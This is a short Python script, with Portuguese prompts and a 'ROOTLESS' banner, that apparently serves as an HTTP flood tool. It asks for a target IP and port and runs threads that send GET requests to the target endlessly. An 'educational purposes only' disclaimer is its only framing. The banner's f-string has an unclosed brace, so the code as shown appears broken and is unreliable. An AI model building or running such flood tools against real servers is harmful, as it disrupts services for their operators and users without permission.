import requests
import threading
import os

os.system('clear')

RED = "\033[91m"
NEON_PURPLE = "\033[95m"
RESET = "\033[0m"


print(f"""\n

{RED}
   __  ___  _    ___  ___  ___ 
 | . |/ __>| |  | __>/ __>/ __>
 | | |\__ \| |_ | _> \__ \\__ \
 `___'<___/|___||___><___/<___/
  
{RESET}
{NEON_PURPLE 
Autor: ROOTLESS
AVISO: Este código é fornecido apenas para fins educacionais. 
O autor não se responsabiliza por qualquer uso indevido ou 
atividades ilegais realizadas com este código. Use-o 
exclusivamente em ambientes controlados e com permissão.                          
{NEON_PURPLE}


\n""")





# Entrada do usuário para o alvo e porta
alvo_ip = str(input("Insira o IP do Alvo: "))
alvo_port = int(input("Insira a porta: "))

# Construção da URL
target_url = f"http://{alvo_ip}:{alvo_port}"

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"{RED}[*]{RESET}{NEON_PURPLE} FAZ O ROOT, FAZ O LESS KKK || {RESET}")
        except requests.RequestException as e:
            print(f"{RED}[ERROR]{RESET}{NEON_PURPLE} {e}{RESET}")

# Número de threads
num_threads = 1 # Ajuste conforme necessário

for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()